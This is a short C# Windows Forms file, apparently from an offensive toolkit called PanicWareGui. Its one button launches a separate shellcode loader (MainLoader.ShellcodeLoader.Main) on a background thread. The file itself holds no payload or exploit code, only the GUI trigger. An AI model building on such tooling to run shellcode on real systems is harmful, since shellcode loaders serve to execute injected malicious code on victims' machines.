using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using MainLoader;

namespace PanicWareGui.Forms
{
    public partial class FormShellcodeLoader : Form
    {
        public FormShellcodeLoader()
        {
            InitializeComponent();
        }
        private void cookbutton_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(new ThreadStart(RunMain));
            t.IsBackground = true;
            t.Start();
        }
        private void RunMain()
        {
            MainLoader.ShellcodeLoader.Main();
        }

    }
}
